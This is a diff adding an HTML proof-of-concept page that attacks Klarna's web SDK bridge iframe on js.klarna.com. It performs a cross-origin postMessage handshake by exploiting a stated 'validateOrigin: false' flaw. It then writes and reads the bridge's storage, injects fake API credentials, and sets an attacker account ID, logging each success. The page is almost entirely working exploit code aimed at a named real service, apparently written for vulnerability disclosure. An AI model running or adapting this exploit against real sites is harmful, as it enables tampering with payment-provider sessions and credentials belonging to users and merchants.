@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Klarna Bridge PoC - Cross-Origin API Access</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px;}
+h1{color:#f0883e;}
+#log{background:#161b22;border:1px solid #30363d;padding:20px;min-height:350px;white-space:pre-wrap;font-size:14px;line-height:1.6;}
+.ok{color:#3fb950;}.warn{color:#f0883e;}.info{color:#58a6ff;}
+</style>
+</head>
+<body>
+<h1>Klarna Bridge PoC - validateOrigin: false Bypass</h1>
+<p>Attacker origin: <strong id="o"></strong> | Target: <strong>https://js.klarna.com</strong></p>
+<pre id="log"></pre>
+<iframe id="bridge" src="https://js.klarna.com/web-sdk/v1/1.0.144/backend_bridge_iframe.html" style="display:none"></iframe>
+<script>
+document.getElementById('o').textContent=window.location.origin;
+const L=(m,c)=>{const s=document.createElement('span');s.className=c||'';s.textContent=m+'\n';document.getElementById('log').appendChild(s);};
+L('[*] Attacker origin: '+window.location.origin,'info');
+L('[*] Target: https://js.klarna.com (DIFFERENT ORIGIN)','info');
+L('[*] Loading bridge iframe...','info');
+const iframe=document.getElementById('bridge');
+const ch=new MessageChannel();
+ch.port1.onmessage=(e)=>{
+  if(e.data==='klarna_initialize_messenger_handshake_complete'){
+    L('','');L('[!!!] HANDSHAKE COMPLETE - validateOrigin:false BYPASSED!','warn');
+    L('[!!!] Foreign origin accepted: '+window.location.origin,'warn');L('','');
+    ch.port1.postMessage({messageId:'1',method:'setStorageItem',data:{key:'poc_key',data:'ATTACKER_DATA'}});
+    setTimeout(()=>ch.port1.postMessage({messageId:'2',method:'getStorageItem',data:{key:'poc_key'}}),300);
+    setTimeout(()=>ch.port1.postMessage({messageId:'3',method:'setupApiCredentials',data:{clientId:'evil',sessionId:'evil-sess',authorizationToken:'INJECTED_TOKEN'}}),600);
+    setTimeout(()=>ch.port1.postMessage({messageId:'4',method:'setAccountId',data:{accountId:'ATTACKER_ACCOUNT'}}),900);
+  } else if(e.data&&e.data.messageId){
+    const d=e.data;
+    const val=d.messageId==='2'?'"'+d.resolve+'" <- DATA CONFIRMED IN js.klarna.com STORAGE':JSON.stringify(d.resolve);
+    L('[+] '+d.method+' -> resolve: '+val,d.messageId==='2'?'warn':'ok');
+    if(d.messageId==='4'){L('','');L('[CONFIRMED] Full cross-origin access to js.klarna.com bridge confirmed','ok');L('[CONFIRMED] Root cause: validateOrigin: !1 in backend_bridge_receiver.js','ok');}
+  }
+};
+iframe.onload=()=>{
+  L('[+] iframe loaded from js.klarna.com','ok');
+  iframe.contentWindow.postMessage({type:'klarna_initialize_messenger_handshake'},'https://js.klarna.com',[ch.port2]);
+};
+</script>
+</body>
+</html>
